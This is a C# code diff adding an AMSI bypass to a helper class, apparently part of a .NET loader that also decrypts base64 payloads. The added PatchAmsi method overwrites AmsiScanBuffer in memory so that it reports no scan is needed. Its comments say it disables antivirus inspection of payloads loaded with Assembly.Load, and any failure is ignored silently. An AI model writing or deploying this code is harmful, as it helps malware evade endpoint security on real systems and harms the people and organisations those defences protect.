@@ -4,11 +4,51 @@
 using System;
 using System.IO;
 using System.Reflection;
+using System.Runtime.InteropServices;
 
 namespace DotnetWorker;
 
 public static class PenumbraHelpers
 {
+    /// <summary>
+    /// Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN.
+    /// This disables AMSI inspection of Assembly.Load(byte[]) payloads.
+    /// </summary>
+    public static void PatchAmsi()
+    {
+        try
+        {
+            var amsi = LoadLibrary("amsi.dll");
+            if (amsi == IntPtr.Zero) return; // AMSI not loaded, nothing to patch
+
+            var asb = GetProcAddress(amsi, "AmsiScanBuffer");
+            if (asb == IntPtr.Zero) return;
+
+            // mov eax, 0x80070057 (E_INVALIDARG — tells caller "no scan needed")
+            // ret
+            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+
+            VirtualProtect(asb, (uint)patch.Length, 0x40, out uint oldProtect);
+            Marshal.Copy(patch, 0, asb, patch.Length);
+            VirtualProtect(asb, (uint)patch.Length, oldProtect, out _);
+        }
+        catch
+        {
+            // Silently ignore — if patching fails, Assembly.Load will still work,
+            // it just won't bypass AMSI
+        }
+    }
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr LoadLibrary(string lpFileName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
+
     public static string Decrypt(string b64Data, string b64Key)
     {
         byte[] data = Convert.FromBase64String(b64Data);
